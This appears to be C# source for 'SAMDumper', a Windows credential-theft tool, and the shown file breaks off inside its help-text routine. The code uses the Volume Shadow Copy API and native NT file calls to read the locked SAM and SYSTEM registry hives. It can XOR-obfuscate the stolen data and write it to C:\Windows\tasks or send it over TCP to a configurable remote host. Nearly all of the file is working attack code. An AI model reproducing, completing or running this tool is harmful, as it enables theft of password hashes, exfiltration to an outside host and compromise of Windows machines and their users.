using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;


class SAMDumper
{
    // Constants
    private const int VSS_CTX_BACKUP = 0;
    private const int VSS_CTX_ALL = unchecked((int)0xffffffff);
    private static readonly Guid GUID_NULL = Guid.Empty;
    private const uint COINIT_MULTITHREADED = 0x0;
    private const int VSS_BT_FULL = 1;
    private const int DEBUG_LEVEL = 1; // 0: Solo errores; 1: Info básica; 2: Debug completo
    private const uint FILE_READ_DATA = 0x0001;
    private const uint FILE_WRITE_DATA = 0x0002;
    private const uint FILE_READ_ATTRIBUTES = 0x0080;
    private const uint FILE_WRITE_ATTRIBUTES = 0x0100;
    private const uint SYNCHRONIZE = 0x00100000;
    private const uint FILE_SHARE_READ = 0x00000001;
    private const uint FILE_OPEN = 0x00000001;
    private const uint FILE_OVERWRITE_IF = 0x00000005;
    private const uint FILE_SYNCHRONOUS_IO_NONALERT = 0x00000010;
    private const uint FILE_ATTRIBUTE_NORMAL = 0x00000080;
    private const uint OBJ_CASE_INSENSITIVE = 0x00000040;

    // Enums
    private enum VSS_OBJECT_TYPE { VSS_OBJECT_UNKNOWN = 0, VSS_OBJECT_NONE = 1, VSS_OBJECT_SNAPSHOT_SET = 2, VSS_OBJECT_SNAPSHOT = 3, VSS_OBJECT_PROVIDER = 4, VSS_OBJECT_TYPE_COUNT = 5 }

    // Structs
    [StructLayout(LayoutKind.Sequential, Pack = 8)] private struct VSS_SNAPSHOT_PROP { public Guid m_SnapshotId; public Guid m_SnapshotSetId; public int m_lSnapshotsCount; public IntPtr m_pwszSnapshotDeviceObject; public IntPtr m_pwszOriginalVolumeName; public IntPtr m_pwszOriginatingMachine; public IntPtr m_pwszServiceMachine; public IntPtr m_pwszExposedName; public IntPtr m_pwszExposedPath; public Guid m_ProviderId; public int m_lSnapshotAttributes; public long m_tsCreationTimestamp; public int m_eStatus; }
    [StructLayout(LayoutKind.Explicit)] private struct VSS_OBJECT_UNION { [FieldOffset(0)] public VSS_SNAPSHOT_PROP Snap; }
    [StructLayout(LayoutKind.Sequential)] private struct VSS_OBJECT_PROP { public VSS_OBJECT_TYPE Type; public VSS_OBJECT_UNION Obj; }
    [StructLayout(LayoutKind.Sequential)] private struct UNICODE_STRING { public ushort Length; public ushort MaximumLength; public IntPtr Buffer; }
    [StructLayout(LayoutKind.Sequential)] private struct OBJECT_ATTRIBUTES { public uint Length; public IntPtr RootDirectory; public IntPtr ObjectName; public uint Attributes; public IntPtr SecurityDescriptor; public IntPtr SecurityQualityOfService; }
    [StructLayout(LayoutKind.Explicit)] private struct IO_STATUS_BLOCK { [FieldOffset(0)] public uint Status; [FieldOffset(0)] public IntPtr Pointer; [FieldOffset(8)] public IntPtr Information; }
    [StructLayout(LayoutKind.Sequential, Pack = 1)] private struct FileHeader { [MarshalAs(UnmanagedType.ByValArray, SizeConst = 32)] public byte[] filename; public uint filesize; public uint checksum; }

    // Interfaces
    [ComImport, Guid("AE1C7110-2F60-11d3-8A39-00C04F72D8E3")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    private interface IVssEnumObject
    {
        [PreserveSig]
        int Next([In] uint celt, [Out] out VSS_OBJECT_PROP rgelt, [Out] out uint pceltFetched);
        void Skip([In] uint celt);
        void Reset();
        void Clone([Out, MarshalAs(UnmanagedType.Interface)] out IVssEnumObject ppenum);
    }

    [ComImport, Guid("507C37B4-CF5B-4e95-B0AF-14EB9767467E")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    private interface IVssAsync
    {
        void Cancel();
        [PreserveSig] int Wait([In] uint dwMilliseconds = 0xFFFFFFFF);
        [PreserveSig] int QueryStatus([Out] out int pHrResult, [Out] out int pReserved);
    }

    [ComImport, Guid("665c1d5f-c218-414d-a05d-7fef5f9d5c86")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    private interface IVssBackupComponents
    {
        void GetWriterComponentsCount([Out] out uint pcComponents);
        [PreserveSig] int GetWriterComponents([In] uint iWriter, [Out, MarshalAs(UnmanagedType.Interface)] out object ppWriter);
        [PreserveSig] int InitializeForBackup([In, MarshalAs(UnmanagedType.BStr)] string bstrXML = null);
        [PreserveSig] int SetBackupState([In, MarshalAs(UnmanagedType.Bool)] bool bSelectComponents, [In, MarshalAs(UnmanagedType.Bool)] bool bBackupBootableSystemState, [In] int backupType, [In, MarshalAs(UnmanagedType.Bool)] bool bPartialFileSupport = false);
        void InitializeForRestore([In, MarshalAs(UnmanagedType.BStr)] string bstrXML);
        [PreserveSig] int SetRestoreState([In] int restoreType);
        [PreserveSig] int GatherWriterMetadata([Out, MarshalAs(UnmanagedType.Interface)] out IVssAsync ppAsync);
        void GetWriterMetadataCount([Out] out uint pcWriters);
        [PreserveSig] int GetWriterMetadata([In] uint iWriter, [Out] out Guid pInstanceId, [Out, MarshalAs(UnmanagedType.Interface)] out object ppMetadata);
        void FreeWriterMetadata();
        [PreserveSig] int AddComponent([In] ref Guid instanceId, [In] ref Guid writerId, [In] int ct, [In, MarshalAs(UnmanagedType.LPWStr)] string wszLogicalPath, [In, MarshalAs(UnmanagedType.LPWStr)] string wszComponentName);
        [PreserveSig] int PrepareForBackup([Out, MarshalAs(UnmanagedType.Interface)] out IVssAsync ppAsync);
        void AbortBackup();
        [PreserveSig] int GatherWriterStatus([Out, MarshalAs(UnmanagedType.Interface)] out IVssAsync pAsync);
        void GetWriterStatusCount([Out] out uint pcWriters);
        void FreeWriterStatus();
        [PreserveSig] int GetWriterStatus([In] uint iWriter, [Out] out Guid pidInstance, [Out] out Guid pidWriter, [Out, MarshalAs(UnmanagedType.BStr)] out string pbstrWriter, [Out] out int pnStatus, [Out] out int phrFailureWriter, [Out] out int phrApplication, [Out, MarshalAs(UnmanagedType.BStr)] out string pbstrApplicationMessage);
        [PreserveSig] int SetBackupSucceeded([In] ref Guid instanceId, [In] ref Guid writerId, [In] int ct, [In, MarshalAs(UnmanagedType.LPWStr)] string wszLogicalPath, [In, MarshalAs(UnmanagedType.LPWStr)] string wszComponentName, [In, MarshalAs(UnmanagedType.Bool)] bool bSucceeded);
        [PreserveSig] int SetBackupOptions([In] ref Guid writerId, [In] int ct, [In, MarshalAs(UnmanagedType.LPWStr)] string wszLogicalPath, [In, MarshalAs(UnmanagedType.LPWStr)] string wszComponentName, [In, MarshalAs(UnmanagedType.LPWStr)] string wszBackupOptions);
        [PreserveSig] int SetSelectedForRestore([In] ref Guid writerId, [In] int ct, [In, MarshalAs(UnmanagedType.LPWStr)] string wszLogicalPath, [In, MarshalAs(UnmanagedType.LPWStr)] string wszComponentName, [In, MarshalAs(UnmanagedType.Bool)] bool bSelectedForRestore);
        [PreserveSig] int SetRestoreOptions([In] ref Guid writerId, [In] int ct, [In, MarshalAs(UnmanagedType.LPWStr)] string wszLogicalPath, [In, MarshalAs(UnmanagedType.LPWStr)] string wszComponentName, [In, MarshalAs(UnmanagedType.LPWStr)] string wszRestoreOptions);
        void SetAdditionalRestores([In] ref Guid writerId, [In] int ct, [In, MarshalAs(UnmanagedType.LPWStr)] string wszLogicalPath, [In, MarshalAs(UnmanagedType.LPWStr)] string wszComponentName, [In, MarshalAs(UnmanagedType.Bool)] bool bAdditionalRestores);
        [PreserveSig] int SetPreviousBackupStamp([In] ref Guid writerId, [In] int ct, [In, MarshalAs(UnmanagedType.LPWStr)] string wszLogicalPath, [In, MarshalAs(UnmanagedType.LPWStr)] string wszComponentName, [In, MarshalAs(UnmanagedType.LPWStr)] string wszPreviousBackupStamp);
        void SaveAsXML([Out, MarshalAs(UnmanagedType.BStr)] out string pbstrXML);
        [PreserveSig] int BackupComplete([Out, MarshalAs(UnmanagedType.Interface)] out IVssAsync ppAsync);
        void AddAlternativeLocationMapping([In] ref Guid writerId, [In] int ct, [In, MarshalAs(UnmanagedType.LPWStr)] string wszLogicalPath, [In, MarshalAs(UnmanagedType.LPWStr)] string wszComponentName, [In, MarshalAs(UnmanagedType.LPWStr)] string wszPath, [In, MarshalAs(UnmanagedType.LPWStr)] string wszFilespec, [In, MarshalAs(UnmanagedType.Bool)] bool bRecursive, [In, MarshalAs(UnmanagedType.LPWStr)] string wszDestination);
        void AddRestoreSubcomponent([In] ref Guid writerId, [In] int ct, [In, MarshalAs(UnmanagedType.LPWStr)] string wszLogicalPath, [In, MarshalAs(UnmanagedType.LPWStr)] string wszComponentName, [In, MarshalAs(UnmanagedType.LPWStr)] string wszSubComponentLogicalPath, [In, MarshalAs(UnmanagedType.LPWStr)] string wszSubComponentName, [In, MarshalAs(UnmanagedType.Bool)] bool bRepair);
        [PreserveSig] int SetFileRestoreStatus([In] ref Guid writerId, [In] int ct, [In, MarshalAs(UnmanagedType.LPWStr)] string wszLogicalPath, [In, MarshalAs(UnmanagedType.LPWStr)] string wszComponentName, [In] int status);
        void AddNewTarget([In] ref Guid writerId, [In] int ct, [In, MarshalAs(UnmanagedType.LPWStr)] string wszLogicalPath, [In, MarshalAs(UnmanagedType.LPWStr)] string wszComponentName, [In, MarshalAs(UnmanagedType.LPWStr)] string wszPath, [In, MarshalAs(UnmanagedType.LPWStr)] string wszFileName, [In, MarshalAs(UnmanagedType.Bool)] bool bRecursive, [In, MarshalAs(UnmanagedType.LPWStr)] string wszAlternatePath);
        [PreserveSig] int SetRangesFilePath([In] ref Guid writerId, [In] int ct, [In, MarshalAs(UnmanagedType.LPWStr)] string wszLogicalPath, [In, MarshalAs(UnmanagedType.LPWStr)] string wszComponentName, [In] uint iPartialFile, [In, MarshalAs(UnmanagedType.LPWStr)] string wszRangesFile);
        [PreserveSig] int PreRestore([Out, MarshalAs(UnmanagedType.Interface)] out IVssAsync ppAsync);
        [PreserveSig] int PostRestore([Out, MarshalAs(UnmanagedType.Interface)] out IVssAsync ppAsync);
        [PreserveSig] int SetContext([In] int lContext);
        [PreserveSig] int StartSnapshotSet([Out] out Guid pSnapshotSetId);
        [PreserveSig] int AddToSnapshotSet([In, MarshalAs(UnmanagedType.LPWStr)] string pwszVolumeName, [In] ref Guid ProviderId, [Out] out Guid pidSnapshot);
        [PreserveSig] int DoSnapshotSet([Out, MarshalAs(UnmanagedType.Interface)] out IVssAsync ppAsync);
        void DeleteSnapshots([In] Guid SourceObjectId, [In] int eSourceObjectType, [In, MarshalAs(UnmanagedType.Bool)] bool bForceDelete, [Out] out int plDeletedSnapshots, [Out] out Guid pNondeletedSnapshotID);
        [PreserveSig] int ImportSnapshots([Out, MarshalAs(UnmanagedType.Interface)] out IVssAsync ppAsync);
        void BreakSnapshotSet([In] ref Guid SnapshotSetId);
        [PreserveSig] int GetSnapshotProperties([In] ref Guid SnapshotId, [Out] out VSS_SNAPSHOT_PROP pProp);
        [PreserveSig] int Query([In] ref Guid QueriedObjectId, [In] VSS_OBJECT_TYPE eQueriedObjectType, [In] VSS_OBJECT_TYPE eReturnedObjectsType, [Out, MarshalAs(UnmanagedType.Interface)] out IVssEnumObject ppEnum);
        [PreserveSig] int IsVolumeSupported([In] ref Guid ProviderId, [In, MarshalAs(UnmanagedType.LPWStr)] string pwszVolumeName, [Out, MarshalAs(UnmanagedType.Bool)] out bool pbSupportedByThisProvider);
        void DisableWriterClasses([In] ref Guid rgWriterClassId, [In] uint cClassId);
        void EnableWriterClasses([In] ref Guid rgWriterClassId, [In] uint cClassId);
        void DisableWriterInstances([In] ref Guid rgWriterInstanceId, [In] uint cInstanceId);
        [PreserveSig] int ExposeSnapshot([In] ref Guid SnapshotId, [In, MarshalAs(UnmanagedType.LPWStr)] string wszPathFromRoot, [In] int lAttributes, [In, MarshalAs(UnmanagedType.LPWStr)] string wszExpose, [Out, MarshalAs(UnmanagedType.LPWStr)] out string pwszExposed);
        void RevertToSnapshot([In] ref Guid SnapshotId, [In, MarshalAs(UnmanagedType.Bool)] bool bForceDismount);
        void QueryRevertStatus([In, MarshalAs(UnmanagedType.LPWStr)] string pwszVolume, [Out, MarshalAs(UnmanagedType.Interface)] out IVssAsync ppAsync);
    }

    // Functions
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)] private static extern IntPtr LoadLibrary(string lpFileName);
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)] private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)] private delegate int CreateVssBackupComponentsDelegate([Out, MarshalAs(UnmanagedType.Interface)] out IVssBackupComponents ppBackup);
    [DllImport("ole32.dll")] private static extern int CoInitializeEx(IntPtr pvReserved, uint dwCoInit);
    [DllImport("ole32.dll")] private static extern void CoUninitialize();
    [DllImport("VssApi.dll", CallingConvention = CallingConvention.StdCall)] private static extern void VssFreeSnapshotProperties([In] ref VSS_SNAPSHOT_PROP pProp);
    [DllImport("ntdll.dll")] private static extern uint NtCreateFile(out IntPtr FileHandle, uint DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, out IO_STATUS_BLOCK IoStatusBlock, IntPtr AllocationSize, uint FileAttributes, uint ShareAccess, uint CreateDisposition, uint CreateOptions, IntPtr EaBuffer, uint EaLength);
    [DllImport("ntdll.dll")] private static extern uint NtReadFile(IntPtr FileHandle, IntPtr Event, IntPtr ApcRoutine, IntPtr ApcContext, out IO_STATUS_BLOCK IoStatusBlock, byte[] Buffer, uint Length, ref long ByteOffset, IntPtr Key);
    [DllImport("ntdll.dll")] private static extern uint NtWriteFile(IntPtr FileHandle, IntPtr Event, IntPtr ApcRoutine, IntPtr ApcContext, out IO_STATUS_BLOCK IoStatusBlock, byte[] Buffer, uint Length, ref long ByteOffset, IntPtr Key);
    [DllImport("ntdll.dll")] private static extern uint NtClose(IntPtr Handle);


    private static IVssBackupComponents CreateVssBackupComponentsInstance()
    {
        IntPtr hModule = LoadLibrary("VssApi.dll");
        if (hModule == IntPtr.Zero)
        {
            int error = Marshal.GetLastWin32Error();
            throw new Exception($"Failed to load VssApi.dll. Error: {error}");
        }

        string[] possibleNames = new string[]
        {
            "CreateVssBackupComponentsInternal",
            "CreateVssBackupComponents",
            "?CreateVssBackupComponents@@YAJPEAPEAVIVssBackupComponents@@@Z",
        };

        IntPtr procAddr = IntPtr.Zero;
        string foundName = null;

        foreach (string name in possibleNames)
        {
            procAddr = GetProcAddress(hModule, name);
            if (procAddr != IntPtr.Zero)
            {
                foundName = name;
                break;
            }
        }

        if (procAddr == IntPtr.Zero)
        {
            int error = Marshal.GetLastWin32Error();
            throw new Exception($"CreateVssBackupComponents not found in VssApi.dll. Error: {error}");
        }

        var createFunc = (CreateVssBackupComponentsDelegate)Marshal.GetDelegateForFunctionPointer(
            procAddr, typeof(CreateVssBackupComponentsDelegate));

        IVssBackupComponents backup;
        int hr = createFunc(out backup);

        if (hr != 0)
        {
            throw new Exception($"CreateVssBackupComponents failed with HRESULT: 0x{hr:X8}");
        }

        if (backup == null)
        {
            throw new Exception("CreateVssBackupComponents returned NULL");
        }

        return backup;
    }


    static bool IsAdministrator()
    {
        try
        {
            var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
            var principal = new System.Security.Principal.WindowsPrincipal(identity);
            return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
        }
        catch
        {
            return false;
        }
    }


    private static bool ListShadows(out string outDeviceObject)
    {
        IVssBackupComponents pBackup = null;
        IVssEnumObject pEnum = null;
        outDeviceObject = "";

        int hrCom = CoInitializeEx(IntPtr.Zero, COINIT_MULTITHREADED);
        if (hrCom != 0 && hrCom != 1)
        {
            Console.WriteLine($"Error initializing COM. HRESULT: 0x{hrCom:X8}");
            return false;
        }

        try
        {
            pBackup = CreateVssBackupComponentsInstance();
            if (pBackup == null)
            {
                Console.WriteLine("Error creating VSS components.");
                return false;
            }

            int hr = pBackup.InitializeForBackup(null);
            if (hr != 0)
            {
                Console.WriteLine($"Error in InitializeForBackup. HRESULT: 0x{hr:X8}");

                if (hr == unchecked((int)0x80042302))
                    Console.WriteLine("  -> VSS_E_UNEXPECTED: Unexpected VSS error");
                else if (hr == unchecked((int)0x8004230C))
                    Console.WriteLine("  -> VSS_E_BAD_STATE: VSS in incorrect state");
                else if (hr == unchecked((int)0x80042308))
                    Console.WriteLine("  -> VSS_E_VOLUME_NOT_SUPPORTED_BY_PROVIDER: Volume not supported");
                return false;
            }

            hr = pBackup.SetContext(VSS_CTX_ALL);
            if (hr != 0)
            {
                hr = pBackup.SetContext(VSS_CTX_BACKUP);
                if (hr != 0)
                {
                    Console.WriteLine($"Error in SetContext. HRESULT: 0x{hr:X8}");
                    return false;
                }
            }

            Guid guidNull = GUID_NULL;
            hr = pBackup.Query(
                ref guidNull,
                VSS_OBJECT_TYPE.VSS_OBJECT_NONE,
                VSS_OBJECT_TYPE.VSS_OBJECT_SNAPSHOT,
                out pEnum
            );

            if (hr != 0 || pEnum == null)
            {
                if (hr != 1)
                {
                    Console.WriteLine($"Error querying snapshots. HRESULT: 0x{hr:X8}");
                }
                return false;
            }

            int count = 0;
            while (true)
            {
                VSS_OBJECT_PROP prop;
                uint fetched;

                hr = pEnum.Next(1, out prop, out fetched);

                if (hr == 1 || fetched == 0)
                    break;

                if (hr != 0)
                {
                    Console.WriteLine($"Error in Next(). HRESULT: 0x{hr:X8}");
                    break;
                }

                if (prop.Type == VSS_OBJECT_TYPE.VSS_OBJECT_SNAPSHOT)
                {
                    count++;
                    Console.WriteLine("═══════════════════════════════════════════════");
                    Console.WriteLine($"Shadow Copy #{count}");
                    Console.WriteLine("═══════════════════════════════════════════════");

                    VSS_SNAPSHOT_PROP snap = prop.Obj.Snap;

                    Console.WriteLine($"ID: {{{snap.m_SnapshotId}}}");
                    Console.WriteLine($"Set ID: {{{snap.m_SnapshotSetId}}}");

                    if (snap.m_pwszSnapshotDeviceObject != IntPtr.Zero)
                    {
                        string deviceObject = Marshal.PtrToStringUni(snap.m_pwszSnapshotDeviceObject);
                        outDeviceObject = deviceObject;
                        Console.WriteLine($"Device Object: {deviceObject}");
                        return true;
                    }

                    if (snap.m_pwszOriginalVolumeName != IntPtr.Zero)
                    {
                        string originalVolume = Marshal.PtrToStringUni(snap.m_pwszOriginalVolumeName);
                        Console.WriteLine($"Original Volume: {originalVolume}");
                    }

                    if (snap.m_pwszOriginatingMachine != IntPtr.Zero)
                    {
                        string machine = Marshal.PtrToStringUni(snap.m_pwszOriginatingMachine);
                        Console.WriteLine($"Originating Machine: {machine}");
                    }

                    DateTime timestamp = DateTime.FromFileTime(snap.m_tsCreationTimestamp);
                    Console.WriteLine($"Creation Date: {timestamp}");
                    Console.WriteLine($"Attributes: 0x{snap.m_lSnapshotAttributes:X}");
                    Console.WriteLine($"Status: {snap.m_eStatus}");
                    Console.WriteLine($"Provider ID: {{{snap.m_ProviderId}}}");

                    Console.WriteLine();

                    VssFreeSnapshotProperties(ref snap);
                }
            }

            if (count == 0)
            {
                Console.WriteLine("No shadow copies found on the system.");
            }
            else
            {
                Console.WriteLine($"Total: {count} shadow copies found");
            }
        }
        finally
        {
            if (pEnum != null)
                Marshal.ReleaseComObject(pEnum);
            if (pBackup != null)
                Marshal.ReleaseComObject(pBackup);

            CoUninitialize();
        }
        return false;
    }


    private static int CreateShadow(string volumePath, out string deviceObject)
    {
        deviceObject = null;
        IVssBackupComponents pBackup = null;

        int hr = CoInitializeEx(IntPtr.Zero, COINIT_MULTITHREADED);
        if (hr != 0 && hr != 1) return hr;

        try
        {
            pBackup = CreateVssBackupComponentsInstance();
            hr = pBackup.InitializeForBackup(null);
            if (hr != 0) return hr;

            Guid guidNull = GUID_NULL;
            bool bSupported = false;
            hr = pBackup.IsVolumeSupported(ref guidNull, volumePath, out bSupported);
            if (hr == 0 && !bSupported) return hr;

            hr = pBackup.SetContext(VSS_CTX_BACKUP);
            if (hr != 0) return hr;

            hr = pBackup.SetBackupState(false, false, VSS_BT_FULL, false);

            IVssAsync pAsyncMetadata = null;
            hr = pBackup.GatherWriterMetadata(out pAsyncMetadata);
            if (hr == 0 && pAsyncMetadata != null)
            {
                pAsyncMetadata.Wait();
                Marshal.ReleaseComObject(pAsyncMetadata);
            }

            Guid snapshotSetId;
            hr = pBackup.StartSnapshotSet(out snapshotSetId);
            if (hr != 0) return hr;

            Guid snapshotId;
            hr = pBackup.AddToSnapshotSet(volumePath, ref guidNull, out snapshotId);
            if (hr != 0) return hr;

            IVssAsync pAsyncPrepare = null;
            hr = pBackup.PrepareForBackup(out pAsyncPrepare);
            if (hr == 0 && pAsyncPrepare != null)
            {
                pAsyncPrepare.Wait();
                Marshal.ReleaseComObject(pAsyncPrepare);
            }

            IVssAsync pAsyncSnapshot = null;
            hr = pBackup.DoSnapshotSet(out pAsyncSnapshot);
            if (hr == 0 && pAsyncSnapshot != null)
            {
                pAsyncSnapshot.Wait();
                Marshal.ReleaseComObject(pAsyncSnapshot);
            }

            if (hr == 0)
            {
                VSS_SNAPSHOT_PROP snapProp;
                hr = pBackup.GetSnapshotProperties(ref snapshotId, out snapProp);
                if (hr == 0)
                {
                    deviceObject = snapProp.m_pwszSnapshotDeviceObject != IntPtr.Zero ? Marshal.PtrToStringUni(snapProp.m_pwszSnapshotDeviceObject) : null;
                    VssFreeSnapshotProperties(ref snapProp);
                    //return snapshotId.ToString();
                }
            }
            return hr;
        }
        finally
        {
            if (pBackup != null) Marshal.ReleaseComObject(pBackup);
            CoUninitialize();
        }
    }


    private static IntPtr OpenFileNT(string filePath)
    {
        IntPtr buffer = Marshal.StringToHGlobalUni(filePath);

        UNICODE_STRING unicodeString = new UNICODE_STRING
        {
            Buffer = buffer,
            Length = (ushort)(filePath.Length * 2),
            MaximumLength = (ushort)((filePath.Length * 2) + 2)
        };

        IntPtr unicodeStringPtr = Marshal.AllocHGlobal(Marshal.SizeOf(unicodeString));
        Marshal.StructureToPtr(unicodeString, unicodeStringPtr, false);

        OBJECT_ATTRIBUTES objectAttributes = new OBJECT_ATTRIBUTES
        {
            Length = (uint)Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES)),
            RootDirectory = IntPtr.Zero,
            ObjectName = unicodeStringPtr,
            Attributes = OBJ_CASE_INSENSITIVE,
            SecurityDescriptor = IntPtr.Zero,
            SecurityQualityOfService = IntPtr.Zero
        };

        IO_STATUS_BLOCK ioStatusBlock;
        IntPtr fileHandle;

        uint status = NtCreateFile(
            out fileHandle,
            FILE_READ_DATA | FILE_READ_ATTRIBUTES,
            ref objectAttributes,
            out ioStatusBlock,
            IntPtr.Zero,
            0,
            FILE_SHARE_READ,
            FILE_OPEN,
            0,
            IntPtr.Zero,
            0);

        Marshal.FreeHGlobal(unicodeStringPtr);
        Marshal.FreeHGlobal(buffer);

        if (status != 0)
        {
            Console.WriteLine($"[-] Error opening the file. NTSTATUS: 0x{status:X8}");
            return IntPtr.Zero;
        }

        return fileHandle;
    }


    private static List<byte> ReadBytesNT(IntPtr fileHandle)
    {
        List<byte> fileContent = new List<byte>();
        IO_STATUS_BLOCK ioStatusBlock;
        long byteOffset = 0;

        while (true)
        {
            byte[] buffer = new byte[1024];

            uint status = NtReadFile(
                fileHandle,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                out ioStatusBlock,
                buffer,
                (uint)buffer.Length,
                ref byteOffset,
                IntPtr.Zero);

            if (status != 0 && status != 0x00000103)
            {
                if (status == 0x80000006) // STATUS_END_OF_FILE
                    break;

                Console.WriteLine($"[-] Error reading. NTSTATUS: 0x{status:X8}");
                break;
            }

            uint bytesRead = (uint)ioStatusBlock.Information.ToInt64();
            if (bytesRead == 0)
                break;

            fileContent.AddRange(buffer.Take((int)bytesRead));
            byteOffset += bytesRead;
        }

        return fileContent;
    }


    private static List<byte> ReadFile(string filePath, bool printBool)
    {
        List<byte> fileContent = new List<byte>();

        IntPtr fileHandle = OpenFileNT(filePath);
        if (fileHandle == IntPtr.Zero)
        {
            Console.WriteLine("[-] Error: Not possible to open the file.");
            return fileContent;
        }

        fileContent = ReadBytesNT(fileHandle);

        NtClose(fileHandle);
        return fileContent;
    }


    private static bool WriteFileNT(string filePath, List<byte> fileData)
    {
        IntPtr buffer = Marshal.StringToHGlobalUni(filePath);

        UNICODE_STRING unicodeString = new UNICODE_STRING
        {
            Buffer = buffer,
            Length = (ushort)(filePath.Length * 2),
            MaximumLength = (ushort)((filePath.Length * 2) + 2)
        };

        IntPtr unicodeStringPtr = Marshal.AllocHGlobal(Marshal.SizeOf(unicodeString));
        Marshal.StructureToPtr(unicodeString, unicodeStringPtr, false);

        OBJECT_ATTRIBUTES objectAttributes = new OBJECT_ATTRIBUTES
        {
            Length = (uint)Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES)),
            RootDirectory = IntPtr.Zero,
            ObjectName = unicodeStringPtr,
            Attributes = OBJ_CASE_INSENSITIVE,
            SecurityDescriptor = IntPtr.Zero,
            SecurityQualityOfService = IntPtr.Zero
        };

        IO_STATUS_BLOCK ioStatusBlock;
        IntPtr fileHandle;

        uint status = NtCreateFile(
            out fileHandle,
            FILE_WRITE_DATA | FILE_WRITE_ATTRIBUTES | SYNCHRONIZE,
            ref objectAttributes,
            out ioStatusBlock,
            IntPtr.Zero,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ,
            FILE_OVERWRITE_IF,
            FILE_SYNCHRONOUS_IO_NONALERT,
            IntPtr.Zero,
            0);

        Marshal.FreeHGlobal(unicodeStringPtr);
        Marshal.FreeHGlobal(buffer);

        if (status != 0)
        {
            Console.WriteLine($"[-] Error creating file: {filePath}. NTSTATUS: 0x{status:X8}");
            return false;
        }

        if (DEBUG_LEVEL >= 2)
        {
            Console.WriteLine($"[+] File created: {filePath}");
        }

        long byteOffset = 0;
        byte[] dataArray = fileData.ToArray();

        status = NtWriteFile(
            fileHandle,
            IntPtr.Zero,
            IntPtr.Zero,
            IntPtr.Zero,
            out ioStatusBlock,
            dataArray,
            (uint)dataArray.Length,
            ref byteOffset,
            IntPtr.Zero);

        if (status != 0)
        {
            Console.WriteLine($"[-] Error writing to file: {filePath}. NTSTATUS: 0x{status:X8}");
            NtClose(fileHandle);
            return false;
        }

        if (DEBUG_LEVEL >= 1)
        {
            Console.WriteLine($"[+] Written {fileData.Count} bytes to {filePath}");
        }

        NtClose(fileHandle);
        return true;
    }

    
    private static List<byte> EncodeBytes(List<byte> dumpBytes, string keyXor)
    {
        List<byte> encodedBytes = new List<byte>(dumpBytes);

        if (string.IsNullOrEmpty(keyXor))
        {
            return encodedBytes;
        }

        int keyLen = keyXor.Length;

        for (int i = 0; i < encodedBytes.Count; i++)
        {
            encodedBytes[i] = (byte)(encodedBytes[i] ^ keyXor[i % keyLen]);
        }

        return encodedBytes;
    }


    private static bool SendFileOverSocket(Socket sock, string filename, List<byte> filedata)
    {
        FileHeader header = new FileHeader
        {
            filename = new byte[32],
            filesize = (uint)IPAddress.HostToNetworkOrder(filedata.Count),
            checksum = (uint)IPAddress.HostToNetworkOrder(0)
        };

        byte[] filenameBytes = Encoding.ASCII.GetBytes(filename);
        Array.Copy(filenameBytes, header.filename, Math.Min(filenameBytes.Length, 32));

        int headerSize = Marshal.SizeOf(header);
        byte[] headerBytes = new byte[headerSize];

        IntPtr headerPtr = Marshal.AllocHGlobal(headerSize);
        Marshal.StructureToPtr(header, headerPtr, false);
        Marshal.Copy(headerPtr, headerBytes, 0, headerSize);
        Marshal.FreeHGlobal(headerPtr);

        try
        {
            int bytesSent = sock.Send(headerBytes);
            if (bytesSent != headerSize)
            {
                Console.WriteLine($"[-] Error sending header for {filename}.");
                return false;
            }

            bytesSent = sock.Send(filedata.ToArray());
            if (bytesSent != filedata.Count)
            {
                Console.WriteLine($"[-] Error sending data for {filename}.");
                return false;
            }

            if (DEBUG_LEVEL >= 1)
            {
                Console.WriteLine($"[+] {filename} sent ({filedata.Count} bytes)");
            }

            return true;
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[-] Error sending file: {ex.Message}");
            return false;
        }
    }


    private static bool SendFilesRemotely(List<byte> samData, List<byte> systemData, string host, int port)
    {
        try
        {
            Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

            IPAddress ipAddress = IPAddress.Parse(host);
            IPEndPoint endPoint = new IPEndPoint(ipAddress, port);

            sock.Connect(endPoint);

            if (DEBUG_LEVEL >= 1)
            {
                Console.WriteLine($"[+] Connected to {host}:{port}");
            }

            bool success = true;
            success &= SendFileOverSocket(sock, "SAM", samData);
            success &= SendFileOverSocket(sock, "SYSTEM", systemData);

            sock.Close();

            return success;
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[-] Error connecting to {host}:{port}: {ex.Message}");
            return false;
        }
    }


    private static bool SaveFilesLocally(List<byte> samData, List<byte> systemData, string basePath, string samFname, string systemFname)
    {
        bool success = true;
        string samPath = "\\??\\" + basePath + samFname;
        string systemPath = "\\??\\" + basePath + systemFname;

        if (!WriteFileNT(samPath, samData))
        {
            Console.WriteLine("[-] Error storing SAM");
            success = false;
        }

        if (!WriteFileNT(systemPath, systemData))
        {
            Console.WriteLine("[-] Error storing SYSTEM");
            success = false;
        }

        return success;
    }


    private static void PrintHelp()
    {
        Console.WriteLine("Usage: SAMDumper.exe [OPTIONS]");
        Console.WriteLine("Options:");
        Console.WriteLine("  --save-local [BOOL]    Save locally (default: false)");
        Console.WriteLine("  --output-dir DIR       Output directory (default: C:\\Windows\\tasks)");
        Console.WriteLine("  --send-remote [BOOL]   Send remotely (default: false)");
        Console.WriteLine("  --host IP              Host for remote sending (default: 127.0.0.1)");
        Console.WriteLine("  --port PORT            Port for remote sending (default: 7777)");
        Console.WriteLine("  --xor-encode [BOOL]    XOR Encode (default: false)");
        Console.WriteLine("  --xor-key KEY          Enable XOR with specified key (default: SAMDump2025)");
